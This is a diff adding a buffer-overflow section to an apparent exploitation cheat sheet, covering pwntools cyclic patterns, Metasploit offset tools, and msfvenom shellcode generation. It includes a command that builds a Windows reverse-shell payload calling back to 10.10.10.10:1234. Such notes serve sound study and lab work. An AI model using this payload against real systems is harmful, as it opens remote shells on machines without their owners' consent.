@@ -68,4 +68,27 @@ s.interactive()
 ```
 
     
-    
+   
+## Buffer Overflow
+
+### cyclic strings to find overflow points
+
+ - With pwntools:
+
+```python
+from pwn import *
+g = cyclic_gen()
+payload = g.get(10000)
+# once crash, call find to have the min payload
+g.find(b"abcd")
+```
+
+ - With msf: `msf-pattern_create -l 5000` then `msf-pattern_offset -q <int value from registry or string pattern>`
+
+### Building shellcode
+
+ - `msf-nasm_shell`
+ - Windows payload to execute calc.exe and -b to specify any bad characters : `msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00\x0A\x0D'`
+ - `msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.10.10 LPORT=1234 -f 'python'`
+ - [Online ASM/DISASM](https://defuse.ca/online-x86-assembler.htm)
+ - Take care of invalid bytes that might stop the reading of the payload by the program
